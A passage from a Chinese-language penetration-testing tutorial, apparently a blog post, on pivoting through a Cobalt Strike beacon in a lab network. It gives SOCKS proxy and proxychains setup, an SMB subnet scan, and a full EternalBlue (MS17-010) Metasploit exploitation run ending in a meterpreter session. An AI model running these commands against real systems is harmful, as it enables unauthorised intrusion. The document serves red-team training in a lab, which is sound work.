class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> socks 9527<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> started SOCKS4a server on: 9527<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以上操作也可以通过图形化的方式进行。</p><p>3、Metasploit 中进行设置</p><p>开启 Metasploit 后，运行 setg 命令</p><pre class="line-numbers language-none"><code class="language-none">setg Proxies socks4:192.168.175.200:9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf5 > setg Proxies socks4:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527Proxies => socks4:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4、扫描 192.168.232.0/24 地址段中的 445 端口</p><p>这里作为演示，只扫描一下 445 端口</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_versionset rhost 192.168.232.0&#x2F;24set threads 64exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf5 > use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version msf5 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> > <span class="token function">set</span> rhost 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24 rhost => 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24msf5 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> > <span class="token function">set</span> threads 64threads => 64msf5 auxiliary<span class="token punctuation">(</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">)</span> > exploit use auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned  44 of 256 hosts <span class="token punctuation">(</span>17<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned  64 of 256 hosts <span class="token punctuation">(</span>25<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 110 of 256 hosts <span class="token punctuation">(</span>42<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 111 of 256 hosts <span class="token punctuation">(</span>43<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 128 of 256 hosts <span class="token punctuation">(</span>50<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>133:445   <span class="token operator">-</span> Host is running Windows 7 Ultimate SP1 <span class="token punctuation">(</span>build:7601<span class="token punctuation">)</span> <span class="token punctuation">(</span>name:WINTEST<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:TEAMSSIX<span class="token punctuation">)</span> <span class="token punctuation">(</span>signatures:optional<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445   <span class="token operator">-</span> Host is running Windows 2008 HPC SP1 <span class="token punctuation">(</span>build:7601<span class="token punctuation">)</span> <span class="token punctuation">(</span>name:WINDC<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:TEAMSSIX<span class="token punctuation">)</span> <span class="token punctuation">(</span>signatures:required<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 165 of 256 hosts <span class="token punctuation">(</span>64<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 184 of 256 hosts <span class="token punctuation">(</span>71<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 220 of 256 hosts <span class="token punctuation">(</span>85<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 249 of 256 hosts <span class="token punctuation">(</span>97<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 256 of 256 hosts <span class="token punctuation">(</span>100<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5、发现利用</p><p>通过扫描发现在 192.168.232.0/24 地址段内，除了已经上线的 <code>133</code> 主机外，还有 <code>132</code> 主机也开放了 445 端口，且该主机为 Windows 2008 的操作系统，这里使用永恒之蓝作为演示。</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhosts 192.168.232.132set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf5 > use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalbluemsf5 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue<span class="token punctuation">)</span> > <span class="token function">set</span> rhosts 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132rhosts => 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132msf5 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue<span class="token punctuation">)</span> > <span class="token function">set</span> payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcppayload => windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcpmsf5 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue<span class="token punctuation">)</span> > exploit <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> <span class="token keyword">Using</span> auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_ms17_010 as check<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445   <span class="token operator">-</span> Host is likely VULNERABLE to MS17<span class="token operator">-</span>010<span class="token operator">!</span> <span class="token operator">-</span> Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 <span class="token punctuation">(</span>64<span class="token operator">-</span>bit<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445   <span class="token operator">-</span> Scanned 1 of 1 hosts <span class="token punctuation">(</span>100<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Connecting to target <span class="token keyword">for</span> exploitation<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Connection established <span class="token keyword">for</span> exploitation<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Target OS selected valid <span class="token keyword">for</span> OS indicated by SMB reply<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> CORE raw buffer dump <span class="token punctuation">(</span>51 bytes<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000010  30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20  008 HPC Edition <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000030  6b 20 31                                         k 1             <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Target arch selected valid <span class="token keyword">for</span> arch indicated by DCE<span class="token operator">/</span>RPC reply<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Trying exploit with 12 Groom Allocations<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending all but last fragment of exploit packet<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Starting non<span class="token operator">-</span>paged pool grooming<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending SMBv2 buffers<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending final SMBv2 buffers<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending last fragment of exploit packet<span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Receiving response <span class="token keyword">from</span> exploit packet<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> ETERNALBLUE overwrite completed successfully <span class="token punctuation">(</span>0xC000000D<span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending egg to corrupted connection<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Triggering free of corrupted buffer<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started bind TCP handler against 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:4444<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>201283 bytes<span class="token punctuation">)</span> to 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:0 <span class="token operator">-</span>> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527<span class="token punctuation">)</span> at 2020<span class="token operator">-</span>09<span class="token operator">-</span>01 22:13:57 <span class="token operator">-</span>0400<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> =<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> =<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-</span>WIN<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> =<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span>meterpreter > ipconfigInterface 11============Name         : Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO<span class="token operator">/</span>1000 MT Network ConnectionHardware MAC : 00:0c:29:d3:6c:3dMTU          : 1500IPv4 Address : 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132IPv4 Netmask : 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0IPv6 Address : fe80::a1ac:3035:cbdf:4872IPv6 Netmask : ffff:ffff:ffff:ffff::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用-ProxyChains-进行代理转发"><a href="#使用-ProxyChains-进行代理转发" class="headerlink" title="使用 ProxyChains 进行代理转发"></a>使用 ProxyChains 进行代理转发</h3><p>使用 ProxyChains 可以使我们为没有代理配置功能的软件强制使用代理</p><ol><li>和<a href="https://teamssix.com/year/200419-150644.html">上一节</a>中介绍的一致，开启一个 socks 代理服务</li><li>配置 <code>/etc/proxychains.conf</code> 文件</li><li>运行 <code>proxychains + 待执行命令</code></li></ol><p>接下来继续<a href="https://teamssix.com/year/200419-150644.html">上一节</a>中的演示环境：</p><blockquote><p>攻击机 IP：192.168.175.200</p><p>上线主机：外部IP 192.168.175.130、内部IP 192.168.232.133</p><p>攻击目标：192.168.232.0/24 地址段</p></blockquote><p>1、设置 socks 代理</p><p>首先开启交互模式，之后开启 socks 代理</p><pre class="line-numbers language-none"><code class="language-none">sleep 0socks 9527<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> <span class="token function">sleep</span> 0<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to become interactive<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytesbeacon> socks 9527<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 16 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> started SOCKS4a server on: 9527<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、配置  ProxyChains</p><p>在攻击机上，配置 <code>/etc/proxychains.conf</code> 文件的最后一行，根据当前攻击主机 IP 与设置的 Socks 端口，修改如下：</p><pre class="line-numbers language-none"><code class="language-none">socks4 192.168.175.200 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、开始使用  ProxyChains</p><p>根据<a href="https://teamssix.com/year/200419-150644.html">上一节</a>使用 Metasploit 的扫描可以知道，在 192.168.232.0/24 地址段中存在主机 192.168.232.132 ，接下来使用 nmap 扫描一下常见的端口，这里以 80,443,445,3389 作为演示。</p><pre class="line-numbers language-none"><code class="language-none">proxychains nmap -sT -Pn 192.168.232.132 -p 80,443,445,3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>-sT：使用 TCP 扫描</p><p>-Pn：不使用 Ping</p><p>-p：指定扫描端口</p><p>注：不加上 -sT -Pn 参数，将无法使用 proxychains 进行代理扫描</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">> proxychains nmap <span class="token operator">-</span>sT <span class="token operator">-</span>Pn 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132 <span class="token operator">-</span>p 80<span class="token punctuation">,</span>443<span class="token punctuation">,</span>445<span class="token punctuation">,</span>3389                       <span class="token namespace">[proxychains]</span> config file found: <span class="token operator">/</span>etc<span class="token operator">/</span>proxychains<span class="token punctuation">.</span>conf<span class="token namespace">[proxychains]</span> preloading <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libproxychains<span class="token punctuation">.</span>so<span class="token punctuation">.</span>4<span class="token namespace">[proxychains]</span> DLL init: proxychains<span class="token operator">-</span>ng 4<span class="token punctuation">.</span>14Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>09<span class="token operator">-</span>07 23:05 EDT<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:80  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  OK<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  OK<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:3389  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  OK<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:443 &lt;<span class="token operator">--</span>deniedNmap scan report <span class="token keyword">for</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>19s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>PORT     STATE  SERVICE80<span class="token operator">/</span>tcp   open   http443<span class="token operator">/</span>tcp  closed https445<span class="token operator">/</span>tcp  open   microsoft<span class="token operator">-</span>ds3389<span class="token operator">/</span>tcp open   ms<span class="token operator">-</span>wbt<span class="token operator">-</span>serverNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 14<span class="token punctuation">.</span>35 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过扫描可以看到目标 80 端口是开放的，接下来使用 curl 作为对比示例。</p><pre class="line-numbers language-none"><code class="language-none">curl 192.168.232.132proxychains curl 192.168.232.132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">> curl 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132curl: <span class="token punctuation">(</span>7<span class="token punctuation">)</span> Failed to connect to 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132 port 80: No route to host> proxychains curl 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132<span class="token namespace">[proxychains]</span> config file found: <span class="token operator">/</span>etc<span class="token operator">/</span>proxychains<span class="token punctuation">.</span>conf<span class="token namespace">[proxychains]</span> preloading <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libproxychains<span class="token punctuation">.</span>so<span class="token punctuation">.</span>4<span class="token namespace">[proxychains]</span> DLL init: proxychains<span class="token operator">-</span>ng 4<span class="token punctuation">.</span>14<span class="token namespace">[proxychains]</span> Strict chain  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:80  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  OK&lt;<span class="token operator">!</span>DOCTYPE html PUBLIC <span class="token string">"-//W3C//DTD XHTML 1.0 Strict//EN"</span> <span class="token string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"</span>>&lt;html xmlns=<span class="token string">"http://www.w3.org/1999/xhtml"</span>>&lt;head>&lt;meta http<span class="token operator">-</span>equiv=<span class="token string">"Content-Type"</span> content=<span class="token string">"text/html; charset=iso-8859-1"</span> <span class="token operator">/</span>>……内容太多，此处省略……                 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、反向转发"><a href="#2、反向转发" class="headerlink" title="2、反向转发"></a>2、反向转发</h2><p>反向转发顾名思义就是和<a href="https://teamssix.com/year/200419-150644.html">上一节</a>中提到的转发路径相反，之前我们设置的代理是 <code>CS服务端 --&gt; 上线主机 --&gt; 内网主机</code>，反向转发则是 <code>内网主机 --&gt; 上线主机 --&gt; CS服务端</code>。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>继续使用上面的演示环境，首先右击上线主机会话，选择 <code>Pivoting --&gt; Listener</code> ，除了 Name 选项之外，CS 都会自动配置好，这里直接使用默认的配置信息。</p><p><img 